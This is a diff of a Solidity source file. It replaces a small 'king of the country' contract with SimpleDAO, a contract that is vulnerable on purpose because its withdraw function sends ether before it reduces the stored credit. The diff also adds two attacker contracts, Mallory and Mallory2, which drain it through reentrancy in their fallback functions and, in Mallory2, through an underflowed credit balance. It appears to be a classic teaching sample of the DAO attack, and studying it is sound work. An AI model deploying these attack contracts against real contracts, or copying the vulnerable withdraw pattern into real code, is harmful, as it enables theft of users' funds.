@@ -1,17 +1,69 @@
-pragma solidity ^0.5.5;
+pragma solidity ^0.4.2;
 
-contract kingOfCountry {
-    address payable  public king;
-    uint256 public price;
-    constructor() public{
-        price=1;
+contract SimpleDAO {   
+  mapping (address => uint) public credit;
+    
+  function donate(address to) payable {
+    credit[to] += msg.value;
+  }
+    
+
+  function withdraw(uint amount) {
+    if (credit[msg.sender]>= amount) {
+      bool res = msg.sender.call.value(amount)();
+      credit[msg.sender]-=amount;
     }
-    function becomeking() payable public {
-        require(msg.value > 0);
-        
-        require(msg.value > price); // 付錢當國王
-        king.transfer(price);   // 給前任補償
-        king = msg.sender;      // 加冕新國王
-        price = msg.value * 2;           // 付兩倍的錢當新國王
+  }  
+
+  function queryCredit(address to) returns (uint){
+    return credit[to];
+  }
+}
+
+
+contract Mallory {
+  SimpleDAO public dao;
+  address owner;
+
+  function Mallory(SimpleDAO addr){ 
+    owner = msg.sender;
+    dao = addr;
+  }
+  
+  function getJackpot() { 
+    bool res = owner.send(this.balance); 
+  }
+
+  function() payable { 
+    dao.withdraw(dao.queryCredit(this)); 
+  }
+}
+
+contract Mallory2 {
+  SimpleDAO public dao;
+  address owner; 
+  bool public performAttack = true;
+
+  function Mallory2(SimpleDAO addr){
+    owner = msg.sender;
+    dao = addr;
+  }
+    
+  function attack() payable{
+    dao.donate.value(1)(this);
+    dao.withdraw(1);
+  }
+
+  function getJackpot(){
+    dao.withdraw(dao.balance);
+    bool res = owner.send(this.balance);
+    performAttack = true;
+  }
+
+  function() payable {
+    if (performAttack) {
+       performAttack = false;
+       dao.withdraw(1);
     }
+  }
 }
